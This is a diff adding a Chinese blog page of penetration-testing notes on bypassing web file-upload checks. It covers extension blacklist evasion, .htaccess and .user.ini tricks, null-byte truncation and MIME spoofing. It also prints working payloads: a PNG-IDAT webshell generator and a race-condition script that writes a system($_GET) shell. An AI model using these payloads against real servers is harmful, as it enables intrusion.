@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zhoumuyun.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="文件上传的绕过方式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://zhoumuyun.com/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="Error">
+<meta property="og:description" content="文件上传的绕过方式">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132106771.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132107976.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/40675528/1704781189550-84e4b648-ca42-4752-8839-b13108c6807b.png?x-oss-process=image/resize,w_937,limit_0">
+<meta property="og:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132107791.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132107751.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132108815.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/40675528/1704785114719-452c11fb-9583-4b18-b922-127963948307.png">
+<meta property="article:published_time" content="2024-01-13T13:12:01.000Z">
+<meta property="article:modified_time" content="2024-01-13T13:14:05.612Z">
+<meta property="article:author" content="Zhou muyun">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132106771.png">
+
+<link rel="canonical" href="http://zhoumuyun.com/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>文件上传 | Error</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://Liuxunzhang/Liuxunzhang.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Error</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zhoumuyun.com/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar2.gif">
+      <meta itemprop="name" content="Zhou muyun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Error">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-13 21:12:01 / 修改时间：21:14:05" itemprop="dateCreated datePublished" datetime="2024-01-13T21:12:01+08:00">2024-01-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">渗透笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文件上传的绕过方式</p>
+<span id="more"></span>
+
+<h2 id="1-禁用js绕过文件检测"><a href="#1-禁用js绕过文件检测" class="headerlink" title="1.禁用js绕过文件检测"></a>1.禁用js绕过文件检测</h2><p>有些网站用的是前端校验，没有把数据传到后端，直接在前端禁用js，就能直接上传</p>
+<h2 id="2-后缀黑名单绕过"><a href="#2-后缀黑名单绕过" class="headerlink" title="2.后缀黑名单绕过"></a>2.后缀黑名单绕过</h2><h3 id="网站采用后缀黑名单-少量几个）"><a href="#网站采用后缀黑名单-少量几个）" class="headerlink" title="网站采用后缀黑名单(少量几个）"></a>网站采用后缀黑名单(少量几个）</h3><p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132106771.png"></p>
+<p>可以采用其他的后缀</p>
+<p>php1,php2,php3,php4,php5,phtml,php</p>
+<h3 id="网站采用后缀黑名单（很多个）"><a href="#网站采用后缀黑名单（很多个）" class="headerlink" title="网站采用后缀黑名单（很多个）"></a>网站采用后缀黑名单（很多个）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这些后缀都被禁止了，我们可以采取大小写绕过</p>
+<p>例如 .Php，只要不和黑名单相同就行了</p>
+<p>因为Windows的后缀是不区分大小写的，大小写绕过黑名单，依然是相同的文件</p>
+<h2 id="3-多文件上传绕过"><a href="#3-多文件上传绕过" class="headerlink" title="3.多文件上传绕过"></a>3.多文件上传绕过</h2><h3 id="上传-htaccess文件"><a href="#上传-htaccess文件" class="headerlink" title="上传.htaccess文件"></a>上传.htaccess文件</h3><p>在phpstudy中,.htaccess的优先级是最高的，会先调用这个文件</p>
+<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132107976.png"></p>
+<p>.htaccess解释</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40675528/1704781189550-84e4b648-ca42-4752-8839-b13108c6807b.png?x-oss-process=image/resize,w_937,limit_0" alt="img"></p>
+<p>1，这份代码会将1.jpg解析成php文件，这份代码只会将1.jpg转化为php，其他名字的不行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132107791.png"></p>
+<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132107751.png"><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132108815.png"></p>
+<p>2，或者是这样写</p>
+<p>AddType application&#x2F;x-httpd-php .gif</p>
+<p>.gif为后缀额度文件都当做php解析</p>
+<h3 id="上传-ini文件"><a href="#上传-ini文件" class="headerlink" title="上传.ini文件"></a>上传.ini文件</h3><p>创建一个**.user.ini<strong>文件并把它上传，内容为</strong>auto-prepend.file-2.jpg**</p>
+<p>上传并访问2.jpg(一句话木马），等待300秒访问readme.php</p>
+<h2 id="4-图片🐎"><a href="#4-图片🐎" class="headerlink" title="4.图片🐎"></a>4.图片🐎</h2><h3 id="突破getimagesize"><a href="#突破getimagesize" class="headerlink" title="突破getimagesize()"></a>突破getimagesize()</h3><p>getimagesize()函数会返回一个数组，其中下标2是图像的类型。1&#x3D;GIF，2&#x3D;JPG, 3&#x3D;PNG。这里上传一个正常图像后缀的图片马，使用文件包含漏洞运行图片马中的恶意代码即可。</p>
+<h3 id="突破exif-imagetype"><a href="#突破exif-imagetype" class="headerlink" title="突破exif_imagetype()"></a>突破exif_imagetype()</h3><p>exif_imagetype()— 判断一个图像的类型。检查图像的第一个字节。可能返回的常量有IMAGETYPE_GIF&#x3D;1；IMAGETYPE_JPEG&#x3D;2;MAGETYPE_PNG&#x3D;3;文件头不正确返回false。上传具有正常文件头的图片马即可。gif的文件头为GIF89a；png的文件头为89504E47；jpg的文件头为FFD8FF。然后使用文件包含漏洞运行图片马中的恶意代码。</p>
+<h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>gif：找到渲染前后没有变化的位置，将PHP代码写进去。</p>
+<p>png：写入IDAT数据块</p>
+<p>使用脚本生成图片马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">         0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">         0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">         0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">         0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">         0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">         0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">         0x66, 0x44, 0x50, 0x33);</span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line"> $r = $p[$y];</span><br><span class="line"> $g = $p[$y+1];</span><br><span class="line"> $b = $p[$y+2];</span><br><span class="line"> $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line"> imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line">imagepng($img,&#x27;./idat.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，在IDAT数据块中，有一句话木马：，这里利用了PHP中的短开标签。</p>
+<p>注意：使用短开标签，需要在php.ini中，将short_open_tag&#x3D;On</p>
+<p>jpg：未测试成功。</p>
+<h3 id="校验图片头部"><a href="#校验图片头部" class="headerlink" title="校验图片头部"></a>校验图片头部</h3><p>可以伪装GIF文件</p>
+<p>gif的文件头为GIF89a；png的文件头为89504E47；jpg的文件头为FFD8FF</p>
+<p>GIF89a</p>
+<?php
+
+?>
+
+<h3 id="校验尾部"><a href="#校验尾部" class="headerlink" title="校验尾部"></a>校验尾部</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40675528/1704785114719-452c11fb-9583-4b18-b922-127963948307.png" alt="img"></p>
+<h2 id="5-Windows操作系统特性"><a href="#5-Windows操作系统特性" class="headerlink" title="5.Windows操作系统特性"></a><strong>5.Windows操作系统特性</strong></h2><p>利用Windows对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范，在最后生成文件时，字符会被自动去除。</p>
+<table>
+<thead>
+<tr>
+<th><strong>上传文件名</strong></th>
+<th><strong>服务器文件名</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file.php[空格]</td>
+<td>file.php</td>
+<td></td>
+</tr>
+<tr>
+<td>file.php[.]</td>
+<td>file.php</td>
+<td>无论多少个.都可以</td>
+</tr>
+<tr>
+<td>file.php[%80-%99]</td>
+<td>file.php</td>
+<td>Burp抓包，在文件名结尾输%80，CTRL+SHIFT+U进行URL-DECODE,或者增加一个空格，再在HEX视图中把20修改为80</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>上传文件名</strong></th>
+<th><strong>服务器生成文件名</strong></th>
+<th><strong>内容</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file.php::$DATA</td>
+<td>file.php</td>
+<td>file.php中的实际内容</td>
+</tr>
+<tr>
+<td>file.php::$DATA……</td>
+<td>file.php</td>
+<td>实际</td>
+</tr>
+</tbody></table>
+<h2 id="6-条件竞争"><a href="#6-条件竞争" class="headerlink" title="6.条件竞争"></a>6.条件竞争</h2><p>发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中</p>
+<p>代码执行逻辑：先移动，后检测，不符合再删除，符合则改名字。</p>
+<p>先用burp一直上传我们的php木马，然后<strong>用另外一个去一直访问上传的文件</strong>，只要有一个访问成功，就说明代码生效，虽然还会被删除</p>
+<p>这份代码就会在图片的上一级保存一个shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;../shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php @system(<span class="subst">$_GET</span>[a])?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在我们不断发送1.php的时候，<strong>要用另外一个线程去访问1.php</strong>，只要有一个访问成功就能在上一级目录留下shell.php，然后就可以访问上一级目录的shell.php。</p>
+<h2 id="7-双后缀名绕过"><a href="#7-双后缀名绕过" class="headerlink" title="7.双后缀名绕过"></a>7.双后缀名绕过</h2><p>应用场景：黑名单、使用str_ireplace()将匹配到的黑名单中的内容替换为空。</p>
+<p>利用方式：因为仅将黑名单中的内容一次替换为空，可以重写绕过。</p>
+<p>xxx.phphpp</p>
+<h2 id="8-白名单绕过"><a href="#8-白名单绕过" class="headerlink" title="8.白名单绕过"></a>8.白名单绕过</h2><h3 id="1-MIME检查"><a href="#1-MIME检查" class="headerlink" title="1.MIME检查"></a>1.MIME检查</h3><p>MIME类型是描述消息内容类型的因特网标准。</p>
+<p>HTTP头部的Content-Type字段的内容就是MIME类型。</p>
+<p>只需要将MIME类型修改为白名单中允许的类型即可。</p>
+<p>比如，图片上传点，允许上传gif、jpeg、png。用Burp抓包，将HTTP头部的Content-Type字段内容修改为：</p>
+<p>Content-Type: image&#x2F;gif或Content-Type: image&#x2F;jpeg或Content-Type: image&#x2F;png</p>
+<h3 id="2-00截断"><a href="#2-00截断" class="headerlink" title="2.%00截断"></a>2.%00截断</h3><p>%00是chr(0)，空字符。</p>
+<p>程序会把%00当做结束符，后面的数据直接忽略掉。</p>
+<p>在文件上传中，利用%00截断，在文件扩展名验证时，是取文件的扩展名来验证，但是最后文件保存在本地时，%00或截断文件名，只保存%00之前的内容。</p>
+<p>应用场景：白名单、上传路径可控、php.ini中的magic_quotes_gpc为off</p>
+<p>利用方式：</p>
+<p>如果上传文件的路径为：用户可控的上传路径&#x2F;随机数.白名单中的后缀</p>
+<p>正常情况下，服务器拼接得到的上传路径为：</p>
+<p>$img_path &#x3D; ..&#x2F;upload&#x2F;5920201223231032.gif;</p>
+<p>而用户在可控的上传路径中，使用%00截断后，拼接得到的上传路径为：</p>
+<p>$img_path &#x3D; ..&#x2F;upload&#x2F;xxx.php%00&#x2F;5920201223231032.gif</p>
+<p>对后缀进行白名单检测，为gif。但是保存在服务器上的文件，却是xxx.php，因为%00之后的内容被截断了。</p>
+<h3 id="3-0x00截断"><a href="#3-0x00截断" class="headerlink" title="3.0x00截断"></a>3.0x00截断</h3><p>条件：php版本&lt;5.3.4、php.ini中的magic_quotes_gpc设置为off、上传路径可控、白名单</p>
+<p>利用方式：</p>
+<p>如果上传文件的路径为：用户可控的上传路径&#x2F;随机数.白名单中的后缀</p>
+<p>正常情况下，服务器拼接得到的上传图像地址为$img_path &#x3D;..&#x2F;upload&#x2F;5920201223231032.gif</p>
+<p>但是，用户如果在可控上传路径中写入一个php后缀，并且php后缀后面有一个0x00字符</p>
+<p>服务器拼接得到的上传图像地址会变为$img_path &#x3D;..&#x2F;upload&#x2F;xxx.php[0x00]&#x2F;5920201223231032.gif</p>
+<p>对后缀进行白名单检测，为gif。但是保存在服务器上的文件，却是xxx.php，因为0x00之后的内容被截断了。</p>
+<h3 id="4-0x0a截断"><a href="#4-0x0a截断" class="headerlink" title="4.0x0a截断"></a>4.<strong>0x0a截断</strong></h3><p>和0x00差不多</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/" rel="prev" title="信息收集之搜索引擎">
+      <i class="fa fa-chevron-left"></i> 信息收集之搜索引擎
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/01/13/%E6%8F%90%E6%9D%83/" rel="next" title="提权">
+      提权 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%A6%81%E7%94%A8js%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="nav-number">1.</span> <span class="nav-text">1.禁用js绕过文件检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">2.后缀黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E9%87%87%E7%94%A8%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95-%E5%B0%91%E9%87%8F%E5%87%A0%E4%B8%AA%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">网站采用后缀黑名单(少量几个）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E9%87%87%E7%94%A8%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%88%E5%BE%88%E5%A4%9A%E4%B8%AA%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">网站采用后缀黑名单（很多个）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%A4%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">3.多文件上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0-htaccess%E6%96%87%E4%BB%B6"><span class="nav-number">3.1.</span> <span class="nav-text">上传.htaccess文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0-ini%E6%96%87%E4%BB%B6"><span class="nav-number">3.2.</span> <span class="nav-text">上传.ini文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%9B%BE%E7%89%87%F0%9F%90%8E"><span class="nav-number">4.</span> <span class="nav-text">4.图片🐎</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AA%81%E7%A0%B4getimagesize"><span class="nav-number">4.1.</span> <span class="nav-text">突破getimagesize()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AA%81%E7%A0%B4exif-imagetype"><span class="nav-number">4.2.</span> <span class="nav-text">突破exif_imagetype()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">4.3.</span> <span class="nav-text">二次渲染</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%A1%E9%AA%8C%E5%9B%BE%E7%89%87%E5%A4%B4%E9%83%A8"><span class="nav-number">4.4.</span> <span class="nav-text">校验图片头部</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%A1%E9%AA%8C%E5%B0%BE%E9%83%A8"><span class="nav-number">4.5.</span> <span class="nav-text">校验尾部</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%B9%E6%80%A7"><span class="nav-number">5.</span> <span class="nav-text">5.Windows操作系统特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 